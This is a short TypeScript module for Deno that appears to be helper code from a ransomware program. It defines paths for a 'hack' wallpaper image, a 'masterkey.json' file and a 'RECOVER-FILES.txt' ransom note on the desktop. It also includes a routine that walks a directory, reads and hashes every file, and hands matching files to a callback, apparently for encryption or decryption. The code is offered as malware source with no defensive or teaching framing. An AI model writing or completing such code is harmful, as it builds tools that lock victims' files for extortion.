import { walk, type WalkEntry } from "@std/fs/walk";
import { getHash } from "./crypto.ts";
import { join } from "@std/path/join";

export function getHomedir() {
  return Deno.env.get("HOME");
}

export function getImagePath(homedir: string) {
  return join(homedir, ".local", "share", "hack_background.png");
}

export function getMasterkeyPath(homedir: string) {
  return join(homedir, ".local", "share", "masterkey.json");
}

export function getNotePath(homedir: string) {
  return join(homedir, "Desktop", "RECOVER-FILES.txt");
}

export async function runForFiles(
  dir: string,
  hashes: string[],
  callback: (
    entry: WalkEntry,
    hash: string,
    data: Uint8Array<ArrayBuffer>,
  ) => void,
) {
  for await (
    const fileEntry of walk(dir, {
      includeDirs: false,
      includeFiles: true,
      includeSymlinks: false,
    })
  ) {
    let data: Uint8Array<ArrayBuffer> | undefined = undefined;
    try {
      data = await Deno.readFileSync(fileEntry.path);
    } catch (_error) {
      // we dont throw errors :)
    }
    if (!data) {
      continue;
    }
    const hash = await getHash(data);
    if (hashes.includes(hash)) {
      await callback(fileEntry, hash, data);
    }
  }
}
